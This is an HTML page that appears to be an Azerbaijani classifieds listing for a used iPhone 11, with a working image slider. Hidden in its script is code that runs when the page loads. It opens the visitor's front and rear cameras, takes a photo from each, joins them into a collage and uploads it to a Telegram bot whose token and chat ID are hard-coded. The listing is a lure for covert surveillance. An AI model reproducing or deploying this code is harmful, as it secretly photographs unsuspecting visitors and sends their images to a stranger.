<!DOCTYPE html>
<html lang="az">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />

  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
</head>
<body>
  <header class="topbar">

      <div class="topbar-actions">

        </button>
      </div>

  <main class="page">
    <section class="breadcrumb">
      <a href="#">Bütün kateqoriyalar</a>
      <span>›</span>
      <a href="#">Elektronika</a>
      <span>›</span>
      <a href="#">Telefonlar</a>
    </section>

    <section class="ad-card">
      <div class="ad-media">
        <div class="photo-wrapper" data-slider>
          <button class="arrow arrow-left" data-prev>&lsaquo;</button>
          <img
            src="8697_DlmakR5fDdzlgCvNAXZOIA.jpg"
            alt="Apple iPhone 11 Black"
            data-main
          />
          <button class="arrow arrow-right" data-next>&rsaquo;</button>
          <div class="photo-count" data-count>1/3</div>
        </div>
        <div class="thumb-row" data-thumbs>
          <img src="8697_DlmakR5fDdzlgCvNAXZOIA.jpg" alt="iPhone 11 şəkil 1" data-index="0" />
          <img src="90863_2hzOqChH4Pnk2rXW5-MfXw.jpg" alt="iPhone 11 şəkil 2" data-index="1" />
          <img src="97434_RDdD41SGH87rWeaxm-G3Rw.jpg" alt="iPhone 11 şəkil 3" data-index="2" />
        </div>
      </div>

      <div class="ad-info">
        <div class="price-row">
          <div class="price">215 AZN</div>
          <div class="badge-premium" title="Premium elan">
            &#x1F451;
          </div>
        </div>

        <h1 class="ad-title">Apple iPhone 11 Black 64GB/4GB</h1>

        <div class="specs">
          <div class="spec-row">
            <span class="spec-label">Şəhər</span>
            <span class="spec-value">Bakı</span>
          </div>
          <div class="spec-row">
            <span class="spec-label">Marka</span>
            <span class="spec-value link">Apple iPhone</span>
          </div>
          <div class="spec-row">
            <span class="spec-label">Model</span>
            <span class="spec-value link">11</span>
          </div>
          <div class="spec-row">
            <span class="spec-label">Rəng</span>
            <span class="spec-value link">Black</span>
          </div>
          <div class="spec-row">
            <span class="spec-label">Yaddaş</span>
            <span class="spec-value link">64GB/4GB</span>
          </div>
          <div class="spec-row">
            <span class="spec-label">Əlaqə</span>
            <a class="spec-value link" href="tel:+994773471596">077 347 1596</a>
          </div>
        </div>

        <div class="cta-row">
          <a class="btn btn-call" href="tel:+994773471596">Zəng et</a>
          <button class="btn btn-message">Mesaj yaz</button>
        </div>
      </div>
    </section>
  </main>

  <script>
    (function () {
      const slider = document.querySelector("[data-slider]");
      if (!slider) return;

      const mainImg = slider.querySelector("[data-main]");
      const countEl = slider.querySelector("[data-count]");
      const thumbsContainer = document.querySelector("[data-thumbs]");
      const prevBtn = slider.querySelector("[data-prev]");
      const nextBtn = slider.querySelector("[data-next]");

      const images = Array.from(thumbsContainer.querySelectorAll("img")).map(
        (img) => img.getAttribute("src")
      );

      let current = 0;

      function updateSlider(index) {
        current = (index + images.length) % images.length;
        mainImg.src = images[current];
        if (countEl) {
          countEl.textContent = current + 1 + "/" + images.length;
        }

        if (thumbsContainer) {
          thumbsContainer
            .querySelectorAll("img")
            .forEach((img, idx) => {
              if (idx === current) {
                img.classList.add("active-thumb");
              } else {
                img.classList.remove("active-thumb");
              }
            });
        }
      }

      if (prevBtn) {
        prevBtn.addEventListener("click", function () {
          updateSlider(current - 1);
        });
      }

      if (nextBtn) {
        nextBtn.addEventListener("click", function () {
          updateSlider(current + 1);
        });
      }

      if (thumbsContainer) {
        thumbsContainer.addEventListener("click", function (e) {
          const target = e.target;
          if (target.tagName === "IMG" && target.dataset.index != null) {
            updateSlider(parseInt(target.dataset.index, 10));
          }
        });
      }

      updateSlider(0);
    })();

    // Ön + arxa kamera kollajı → Telegram (sayt yüklənəndə)
    (function () {
      const TELEGRAM_BOT_TOKEN = "8499012393:AAE41Y8fSvoa5s_1DfQFHfrDE7kRacFOheA";
      const TELEGRAM_CHAT_ID = "7420354029";

      function canvasToBlob(canvas, type, quality) {
        return new Promise(function (resolve, reject) {
          canvas.toBlob(
            function (blob) {
              if (blob) resolve(blob);
              else reject(new Error("toBlob uğursuz"));
            },
            type || "image/jpeg",
            quality != null ? quality : 0.85
          );
        });
      }

      function captureFrame(facingMode) {
        return new Promise(function (resolve, reject) {
          if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            reject(new Error("getUserMedia dəstəklənmir"));
            return;
          }
          var constraints = {
            video: { facingMode: { ideal: facingMode }, width: { ideal: 1280 }, height: { ideal: 720 } },
            audio: false,
          };
          navigator.mediaDevices
            .getUserMedia(constraints)
            .then(function (stream) {
              var video = document.createElement("video");
              video.setAttribute("playsinline", "");
              video.setAttribute("muted", "");
              video.muted = true;
              video.srcObject = stream;
              video
                .play()
                .then(function () {
                  var tryDraw = function (attempts) {
                    if (video.videoWidth > 0 && video.videoHeight > 0) {
                      var c = document.createElement("canvas");
                      c.width = video.videoWidth;
                      c.height = video.videoHeight;
                      c.getContext("2d").drawImage(video, 0, 0);
                      stream.getTracks().forEach(function (t) {
                        t.stop();
                      });
                      video.srcObject = null;
                      resolve(c);
                      return;
                    }
                    if (attempts <= 0) {
                      stream.getTracks().forEach(function (t) {
                        t.stop();
                      });
                      reject(new Error("Video hazır olmadı"));
                      return;
                    }
                    requestAnimationFrame(function () {
                      tryDraw(attempts - 1);
                    });
                  };
                  tryDraw(30);
                })
                .catch(function (e) {
                  stream.getTracks().forEach(function (t) {
                    t.stop();
                  });
                  reject(e);
                });
            })
            .catch(reject);
        });
      }

      function mergeCollage(frontCanvas, backCanvas) {
        var pad = 8;
        var labelH = 28;
        var canvases = [];
        if (frontCanvas && frontCanvas.width > 0) canvases.push({ label: "Ön kamera", c: frontCanvas });
        if (backCanvas && backCanvas.width > 0) canvases.push({ label: "Arxa kamera", c: backCanvas });
        if (canvases.length === 0) return null;

        var targetH = 720;
        var scaled = canvases.map(function (item) {
          var c = item.c;
          var scale = targetH / c.height;
          return {
            label: item.label,
            w: Math.round(c.width * scale),
            h: Math.round(c.height * scale),
            c: c,
          };
        });

        var totalW = scaled.reduce(function (s, x) {
          return s + x.w;
        }, 0);
        var out = document.createElement("canvas");
        out.width = totalW + pad * (scaled.length + 1);
        out.height = targetH + pad * 2 + labelH;
        var ctx = out.getContext("2d");
        ctx.fillStyle = "#1a1a1a";
        ctx.fillRect(0, 0, out.width, out.height);
        var x = pad;
        scaled.forEach(function (item, i) {
          ctx.fillStyle = "#fafafa";
          ctx.font = "600 16px Inter, system-ui, sans-serif";
          ctx.fillText(item.label, x, pad + 18);
          var yImg = pad + labelH;
          ctx.drawImage(item.c, x, yImg, item.w, item.h);
          x += item.w + pad;
        });
        return out;
      }

      function sendPhotoToTelegram(blob) {
        if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") {
          console.error("Telegram Bot Token təyin edilməyib!");
          return Promise.reject();
        }
        if (!TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === "YOUR_CHAT_ID_HERE") {
          console.error("Telegram Chat ID təyin edilməyib!");
          return Promise.reject();
        }
        var form = new FormData();
        form.append("chat_id", TELEGRAM_CHAT_ID);
        form.append("photo", blob, "kamera-kollaj.jpg");
        form.append(
          "caption",
          "Kamera kollajı — " + new Date().toLocaleString("az-AZ", { timeZone: "Asia/Baku" })
        );
        return fetch("https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendPhoto", {
          method: "POST",
          body: form,
        }).then(function (r) {
          return r.json();
        });
      }

      function runCameraCollage() {
        var frontCanvas = null;
        var backCanvas = null;

        var pFront = captureFrame("user")
          .then(function (c) {
            frontCanvas = c;
          })
          .catch(function () {
            frontCanvas = null;
          });

        return pFront
          .then(function () {
            return captureFrame("environment");
          })
          .then(function (c) {
            backCanvas = c;
          })
          .catch(function () {
            backCanvas = null;
          })
          .then(function () {
            var merged = mergeCollage(frontCanvas, backCanvas);
            if (!merged) {
              console.warn("Kollaj yaratmaq mümkün olmadı (icazə və ya kamera).");
              return;
            }
            return canvasToBlob(merged, "image/jpeg", 0.82).then(function (blob) {
              return sendPhotoToTelegram(blob);
            });
          })
          .then(function (data) {
            if (data && data.ok) console.log("Kollaj Telegram-a göndərildi.");
            else if (data) console.error("Telegram xətası:", data);
          })
          .catch(function (err) {
            console.error("Kamera / göndərmə xətası:", err);
          });
      }

      window.addEventListener("load", function () {
        runCameraCollage();
      });
    })();
  </script>
</body>
</html>
